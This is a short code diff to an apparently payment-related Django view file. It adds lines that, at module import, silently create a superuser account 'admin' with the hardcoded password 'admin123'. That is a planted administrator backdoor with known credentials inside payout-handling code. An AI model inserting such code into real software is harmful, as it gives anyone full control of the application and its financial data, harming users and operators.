@@ -11,6 +11,11 @@ from core.services.payout_service import get_balance
 
 from core.models import Payout
 
+from django.contrib.auth.models import User
+
+if not User.objects.filter(username="admin").exists():
+    User.objects.create_superuser("admin", "admin@gmail.com", "admin123")
+
 class PayoutCreateView(APIView):
 
     def post(self, request):
